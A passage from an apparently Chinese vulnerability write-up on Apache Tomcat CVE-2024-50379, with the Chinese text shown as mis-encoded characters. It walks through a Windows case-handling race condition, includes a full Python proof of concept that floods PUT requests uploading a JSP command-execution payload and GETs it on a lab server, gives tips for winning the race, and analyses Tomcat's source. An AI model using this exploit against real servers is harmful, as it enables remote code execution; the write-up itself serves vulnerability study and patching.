ï¼ˆå¤±è´¥ï¼‰</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.34.25.png" style="zoom:50%;"><ul><li>%00 ï¼ˆå¤±è´¥ï¼‰</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.35.22.png" style="zoom:50%;"><ul><li>ç©ºæ ¼ ï¼ˆå¤±è´¥ï¼‰</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.35.56.png" style="zoom:50%;"><ul><li>æ”¹å˜å¤§å°å†™ï¼ˆæˆåŠŸä¸Šä¼ âœ…ï¼Œä½†ä¸ä¼šè§£ææ‰§è¡Œï¼Œæ— æ³•è§¦å‘RCEï¼‰</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.36.52.png" style="zoom:50%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.37.58.png" style="zoom:50%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.39.08.png" style="zoom:50%;"><p>ç”¨getè®¿é—®æ—¶1.Jspæ—¶ä¸ä¼šè§¦å‘RCEã€‚</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.40.03.png" style="zoom:50%;"><p>è®¿é—®1.jspæ˜¯èµ„æºä¸å­˜åœ¨ã€‚</p><h3 id="2-2-1-æ‰‹åŠ¨å°†1-Jspæ”¹æˆ1-jspè§¦å‘RCE"><a href="#2-2-1-æ‰‹åŠ¨å°†1-Jspæ”¹æˆ1-jspè§¦å‘RCE" class="headerlink" title="2.2.1 æ‰‹åŠ¨å°†1.Jspæ”¹æˆ1.jspè§¦å‘RCE"></a>2.2.1 æ‰‹åŠ¨å°†1.Jspæ”¹æˆ1.jspè§¦å‘RCE</h3><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.41.42.png" style="zoom:80%;"><p>å‘é€getè¯·æ±‚ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET /1.jsp HTTP/1.1Host: <span class="token number">192.168</span>.155.19:8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.42.19.png" style="zoom:50%;"><p>æˆåŠŸè§¦å‘RCEï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h3 id="2-2-2-åŸºäºæ¡ä»¶ç«äº‰è§¦å‘RCE"><a href="#2-2-2-åŸºäºæ¡ä»¶ç«äº‰è§¦å‘RCE" class="headerlink" title="2.2.2 åŸºäºæ¡ä»¶ç«äº‰è§¦å‘RCE"></a>2.2.2 åŸºäºæ¡ä»¶ç«äº‰è§¦å‘RCE</h3><p>ç°åœ¨çš„æƒ…å†µæ˜¯ï¼Œæˆ‘ä»¬èƒ½å¤Ÿä¸Šä¼ ç±»ä¼¼poc.Jspçš„æ–‡ä»¶ï¼Œä½†æ˜¯GET poc.Jspå¹¶ä¸ä¼šè§¦å‘æœåŠ¡ç«¯æ‰§è¡Œæ¶æ„ä»£ç ï¼Œåªæœ‰GET poc.jspæ—¶ä¼šè§¦å‘RCEã€‚</p><p>åŸºäºCVE-2024-50379ï¼Œæˆ‘ä»¬å¹¶å‘çš„ä¸Šä¼ poc.Jspï¼Œå¹¶ä¸”ä¹Ÿå¹¶å‘çš„GET poc.jspï¼Œåªè¦åœ¨åˆé€‚çš„æ—¶é—´çª—å£å†…ï¼ˆå…·ä½“è¿™ä¸ªçª—å£çš„åŸç†åç»­åˆ†æï¼‰å°±èƒ½å¤ŸæˆåŠŸè§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚</p><ul><li>PUT poc.Jsp</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.51.51.png" style="zoom:50%;"><ul><li>GET poc.jsp</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.53.24.png" style="zoom:50%;"><p>å› ä¸ºè¦å°½å¯èƒ½çš„åœ¨ä¸€ä¸ªæ—¶é—´çª—å£å†…è§¦å‘ï¼ŒGETè¯·æ±‚çš„å¹¶å‘çº¿ç¨‹æ•°å¤šä¸€äº›ã€‚</p><p>å•ç‹¬æœ‰å‰ä¸¤ä¸ªçº¿ç¨‹æ²¡æœ‰è§¦å‘æˆåŠŸçš„è¯å¯ä»¥å†æ·»åŠ ä¸€ä¸ªå¹¶å‘çš„PUTè¯·æ±‚ã€‚</p><ul><li>å†æ·»åŠ ä¸€ä¸ªPUT poc2.Jsp</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2017.01.32.png" style="zoom:50%;"><p>è¿˜æ˜¯æ²¡èƒ½è§¦å‘ã€‚</p><p>GET poc.jsp å¹¶å‘çº¿ç¨‹è®¾ç½®ä¸º10000ä¹Ÿæ²¡èƒ½è§¦å‘æˆåŠŸï¼Œååˆæ”¹å›5000.</p><p>å¦‚æœæƒ³æˆåŠŸç‡é«˜ä¸€ç‚¹å»ºè®®ç”¨è™šæ‹Ÿæœºï¼ŒæŠŠå†…æ ¸ã€å†…å­˜å¤§å°è®¾ç½®å°ä¸€ç‚¹ã€‚</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2017.14.18.png" alt="åŸè®¾ç½®" style="zoom:50%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2017.15.49.png" alt="å†…å­˜æ”¹åˆ°256M" style="zoom:50%;"><p>æ¯”è¾ƒéšç¼˜ã€‚åœ¨æ‰§è¡Œåˆ°åæœŸé€šå¸¸éƒ½ä¼šæˆåŠŸï¼Œéœ€è¦è€å¿ƒç­‰å¾…ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-27%2010.12.34.png" style="zoom:67%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-27%2010.14.40.png" style="zoom:50%;"><p>ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œæœ¬æ¥æœåŠ¡ç«¯ä¸å­˜åœ¨evil.jspæ¶æ„ä»£ç æ–‡ä»¶ï¼ˆæœ‰çš„åªæ˜¯evil.Jspï¼‰ï¼Œä½†æ˜¯åœ¨æ¡ä»¶ç«äº‰çš„æƒ…å†µä¸‹è¢«æˆåŠŸGETå¹¶æ‰§è¡Œäº†ã€‚</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-27%2010.17.23.png" style="zoom:50%;"><p>ä¸‹é¢ç»“åˆPOCä¸€èµ·æ‰“çš„æ—¶å€™ä¹ŸæˆåŠŸäº†ã€‚</p><h2 id="2-3-POC"><a href="#2-3-POC" class="headerlink" title="2.3 POC"></a>2.3 POC</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> asyncio<span class="token keyword">import</span> aiohttp<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">send_request</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> method<span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> session<span class="token punctuation">.</span>request<span class="token punctuation">(</span>method<span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span> <span class="token keyword">as</span> response<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Request to </span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string"> completed with status </span><span class="token interpolation"><span class="token punctuation">{</span>response<span class="token punctuation">.</span>status<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Request to </span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string"> failed: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">async</span> <span class="token keyword">with</span> aiohttp<span class="token punctuation">.</span>ClientSession<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        tasks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># å¾ªç¯100æ¬¡</span>            tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>send_request<span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token string">'PUT'</span><span class="token punctuation">,</span> <span class="token string">'http://192.168.155.19:8080/evil.Jsp'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'&lt;% Runtime.getRuntime().exec("calc.exe");%&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>send_request<span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token string">'PUT'</span><span class="token punctuation">,</span> <span class="token string">'http://192.168.155.19:8080/test.Jsp'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'&lt;% Runtime.getRuntime().exec("calc.exe");%&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>send_request<span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'http://192.168.155.19:8080/evil.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># å¹¶å‘æ‰§è¡Œæ‰€æœ‰ä»»åŠ¡</span>        responses <span class="token operator">=</span> <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>gather<span class="token punctuation">(</span><span class="token operator">*</span>tasks<span class="token punctuation">)</span>        <span class="token comment"># æ‰“å°éƒ¨åˆ†å“åº”ç»“æœï¼ˆå¯é€‰ï¼‰</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span> response <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>responses<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> response<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Response </span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{</span>response<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">100]</span><span class="token punctuation">}</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span><span class="token comment"># è¿è¡Œä¸»å‡½æ•°</span>asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥ä½¿ç”¨POC+yakitä¸€èµ·æ‰“ã€‚</p><p>æˆåŠŸå¼¹å‡ºå¤§é‡çš„è®¡ç®—å™¨ï¼Œè¡¨æ˜æ¶æ„ä»£ç æˆåŠŸæ‰§è¡Œäº†ã€‚</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-27%2009.00.02.png" style="zoom:50%;"><h1 id="ä¸‰ã€ä»£ç å®¡è®¡â€”â€”åº•å±‚åŸç†å‰–æ"><a href="#ä¸‰ã€ä»£ç å®¡è®¡â€”â€”åº•å±‚åŸç†å‰–æ" class="headerlink" title="ä¸‰ã€ä»£ç å®¡è®¡â€”â€”åº•å±‚åŸç†å‰–æ"></a>ä¸‰ã€ä»£ç å®¡è®¡â€”â€”åº•å±‚åŸç†å‰–æ</h1><p>CVE-2024-50379æ˜¯ä¸€ä¸ªApache Tomcatçš„æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå…¶åº•å±‚åŸç†æ¶‰åŠåˆ°Windowsæ–‡ä»¶ç³»ç»Ÿå’ŒTomcatåœ¨è·¯å¾„å¤§å°å†™å¤„ç†ä¸Šçš„ä¸ä¸€è‡´æ€§ã€‚</p><h2 id="3-1-Fileå¯¹è±¡çš„getCanonicalPathæ–¹æ³•å’Œexistsæ–¹æ³•"><a href="#3-1-Fileå¯¹è±¡çš„getCanonicalPathæ–¹æ³•å’Œexistsæ–¹æ³•" class="headerlink" title="3.1 Fileå¯¹è±¡çš„getCanonicalPathæ–¹æ³•å’Œexistsæ–¹æ³•"></a>3.1 <code>File</code>å¯¹è±¡çš„<code>getCanonicalPath</code>æ–¹æ³•å’Œ<code>exists</code>æ–¹æ³•</h2><p>è¿™æ®µJavaä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„æµ‹è¯•ç¨‹åºï¼Œç”¨äºæ¼”ç¤º<code>File</code>å¯¹è±¡çš„<code>getCanonicalPath</code>æ–¹æ³•å’Œ<code>exists</code>æ–¹æ³•çš„è¡Œä¸ºã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyTest</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">SimpleDateFormat</span> sdf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"HH:mm:ss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"D:\\dev\\apache-tomcat-9.0.98\\webapps\\ROOT\\poc2.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> canonicalPath <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getCanonicalPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sdf<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\t"</span> <span class="token operator">+</span> canonicalPath <span class="token operator">+</span> <span class="token string">"\t"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"yes"</span> <span class="token operator">:</span> <span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™æ®µJavaä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„æµ‹è¯•ç¨‹åºï¼Œç”¨äºæ¼”ç¤º<code>File</code>å¯¹è±¡çš„<code>getCanonicalPath</code>æ–¹æ³•å’Œ<code>exists</code>æ–¹æ³•çš„è¡Œä¸ºã€‚ä¸‹é¢æ˜¯å¯¹è¿™æ®µä»£ç çš„è¯¦ç»†è§£é‡Šï¼š</p><ol><li><strong>SimpleDateFormat ç±»</strong>ï¼š<ul><li><code>SimpleDateFormat</code> æ˜¯ä¸€ä¸ªç”¨äºæ ¼å¼åŒ–å’Œè§£ææ—¥æœŸçš„ç±»ã€‚åœ¨è¿™é‡Œï¼Œå®ƒè¢«ç”¨æ¥ä»¥ <code>"HH:mm:ss"</code> çš„æ ¼å¼æ˜¾ç¤ºå½“å‰æ—¶é—´ã€‚</li></ul></li><li><code>File</code> æ˜¯ä¸€ä¸ªæŠ½è±¡çš„ç±»ï¼Œç”¨äºè¡¨ç¤ºæ–‡ä»¶å’Œç›®å½•è·¯å¾„åçš„æŠ½è±¡è¡¨ç¤ºå½¢å¼ã€‚å®ƒæä¾›äº†ä¸€äº›æ–¹æ³•æ¥æ“ä½œå®é™…çš„æ–‡ä»¶å’Œç›®å½•ã€‚</li><li><strong>getCanonicalPath æ–¹æ³•</strong>ï¼š<ul><li><code>getCanonicalPath</code> æ–¹æ³•è¢«è°ƒç”¨æ¥è·å–æ–‡ä»¶çš„è§„èŒƒåŒ–è·¯å¾„ã€‚è§„èŒƒåŒ–è·¯å¾„æ˜¯ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œå®ƒæ¶ˆé™¤äº†æ‰€æœ‰ç›¸å¯¹è·¯å¾„çš„å¼•ç”¨ï¼ˆå¦‚ <code>.</code> å’Œ <code>..</code>ï¼‰ï¼Œå¹¶ä¸”åæ˜ äº†æ–‡ä»¶ç³»ç»Ÿçš„å®é™…å¤§å°å†™ã€‚</li></ul></li><li>**TimeUnit.SECONDS.sleep(1)**ï¼š<ul><li>ç¨‹åºåœ¨æ¯æ¬¡å¾ªç¯åæš‚åœ1ç§’é’Ÿã€‚<code>TimeUnit.SECONDS.sleep(1)</code> æ˜¯ä¸€ä¸ªé™æ€å¯¼å…¥ï¼Œå®ƒä½¿ç¨‹åºåœ¨ç»§ç»­ä¸‹ä¸€æ¬¡å¾ªç¯ä¹‹å‰ä¼‘çœ 1ç§’ã€‚</li></ul></li></ol><p>åœ¨CVE-2024-50379æ¼æ´çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œè¿™æ®µä»£ç å¯ä»¥ç”¨æ¥å±•ç¤ºåœ¨Windowsæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶åçš„å¤§å°å†™æ˜¯å¦‚ä½•è¢«å¤„ç†çš„ï¼Œä»¥åŠè¿™å¦‚ä½•å¯èƒ½å½±å“TomcatæœåŠ¡å™¨çš„è¡Œä¸ºã€‚</p></blockquote><ul><li>å½“ç£ç›˜ç›®å½•ä¸Šä¸å­˜åœ¨poc2.jspæ—¶ï¼Œä¼šçœ‹åˆ°è¿™æ ·çš„è¾“å‡ºï¼š</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.24.54.png" alt="æˆªå±2024-12-26 14.24.54" style="zoom:40%;"><ul><li>æ¨¡æ‹Ÿæ‰§è¡ŒPUT /poc2.JSP ä¸Šä¼ ä¸€ä¸ªpoc2.JSPæ–‡ä»¶ï¼Œä¼šå‘ç°getCanonicalPathå‡½æ•°å°†JSPè½¬æ¢ä¸ºäº†å°å†™çš„jspï¼Œä¸”existså‡½æ•°åˆ¤æ–­å°å†™çš„jspæ–‡ä»¶å­˜åœ¨ï¼š</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.25.22.png" alt="æˆªå±2024-12-26 14.25.22" style="zoom:50%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.25.46.png" style="zoom:40%;"><ul><li>å†ç­‰å¾…å‡ ç§’åä¼šå‘ç°ï¼šå°å†™çš„jspåç¼€å˜ä¸ºäº†å¤§å†™çš„JSPï¼Œä½†æ­¤æ—¶existså‡½æ•°ä»ç„¶åˆ¤æ–­å°å†™çš„jspæ–‡ä»¶å­˜åœ¨ï¼ˆè¿™æ˜¯å› ä¸ºwindowså¯¹å¤§å°å†™ä¸æ•æ„Ÿçš„åŸå› ï¼Œwindowsä¸Šä»»åŠ¡1.JSPå’Œ1.jspæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼‰ï¼š</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.26.14.png" style="zoom:40%;"><p>è¿™æ˜¯JDK 1.8 java.io.File#getCanonicalPath æ–¹æ³•åœ¨Windowsä¸Šçš„è¡¨ç°ã€‚Tomcatçš„è¿™ä¸ªæ¼æ´ä¹Ÿæ­£æ˜¯åˆ©ç”¨äº†è¿™ä¸ªç‰¹ç‚¹ã€‚</p><h2 id="3-2-Tomcatæ¼æ´æºä»£ç åˆ†æ-9-0-63ä¸ºä¾‹"><a href="#3-2-Tomcatæ¼æ´æºä»£ç åˆ†æ-9-0-63ä¸ºä¾‹" class="headerlink" title="3.2 Tomcatæ¼æ´æºä»£ç åˆ†æ(9.0.63ä¸ºä¾‹)"></a>3.2 Tomcatæ¼æ´æºä»£ç åˆ†æ(9.0.63ä¸ºä¾‹)</h2><p>åœ¨tomcatæºç ä¸­ï¼Œorg.apache.catalina.webresources.AbstractFileResourceSet#<code>file</code> æ–¹æ³•ç¬¬94è¡Œè°ƒç”¨äº†getCanonicalPathæ–¹æ³•</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.43.01.png" style="zoom:45%;"><p>ä»ä¸Šé¢å°èŠ‚çš„æ¼”ç¤ºæ¥çœ‹ï¼Œå½“åˆšåˆšæ‰§è¡Œ PUT /poc2.JSP æ“ä½œåï¼ŒcanPathæ˜¯ä¸€ä¸ªå°å†™çš„ .jsp ç»“å°¾çš„æ–‡ä»¶ã€‚</p><p>ç„¶åå›åˆ°ä¸Šå±‚<code>getResource</code>æ–¹æ³•ä¸­ï¼Œç¬¬105è¡Œåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œç”±äºæ­¤æ—¶å·²ç»ä¸Šä¼ äº† poc*.JSP æ–‡ä»¶ï¼Œf.exists()ä¼šè¿”å›trueï¼ˆwindowså¤§å°å†™ä¸æ•æ„Ÿï¼‰ï¼Œäºæ˜¯åœ¨ç¬¬111è¡Œè¿”å›äº†ä¸€ä¸ª FileResource å¯¹è±¡ï¼Œæœ‰äº†è¿™ä¸ªFileResourceå¯¹è±¡tomcatå°±ä¼šæ‰¾åˆ°ç›¸åº”çš„jspå¹¶ç¼–è¯‘æˆservletæ‰§è¡Œï¼Œäºæ˜¯RCEå°±è§¦å‘äº†ã€‚</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.49.27.png" style="zoom:80%;"><p>ä¸ºä»€ä¹ˆå†è¿‡å‡ ç§’ä¹‹åå°±æ— æ³•è§¦å‘äº†å‘¢ï¼Ÿæ¢è¨€ä¹‹ä¸ºä»€ä¹ˆè¿™ä¸ªæ¼æ´ç§°ä¹‹ä¸ºæ¡ä»¶ç«äº‰å‘¢ï¼Ÿ</p><p>å› ä¸ºè¿‡äº†è¿™ä¸ªæ—¶é—´å·®ä¹‹åï¼Œfile.getCanonicalPath è·å–çš„å€¼å°±å˜ä¸ºäº† *.JSP å¤§å†™ç»“å°¾çš„è·¯å¾„ï¼Œä½†è°ƒç”¨ file.getAbsolutePath() æ–¹æ³•ä¾ç„¶ä¼šè¿”å› *.jsp å°å†™ç»“å°¾çš„è·¯å¾„ï¼Œäºæ˜¯ file æ–¹æ³•ç¬¬141è¡Œçš„equalsæ–¹æ³•ä¼šè¿”å›falseï¼Œå†å–åä¸ºtrueï¼Œäºæ˜¯æ‰§è¡Œåˆ°145è¡Œè¿”å›ä¸€ä¸ªnullï¼š</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.58.56.png" alt="file.getAbsolutePathè¿”å›å°å†™çš„jsp" style="zoom:50%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2015.00.11.png" style="zoom:50%;"><p>å†è¿”å›ä¸Šå±‚getResourceæ–¹æ³•ä¸­ï¼Œæ­¤æ—¶å¾—åˆ°çš„ f æ˜¯nullï¼Œåˆ™ä¼šè¿”å›ä¸€ä¸ªç©ºèµ„æº EmptyResourceï¼š</p><img 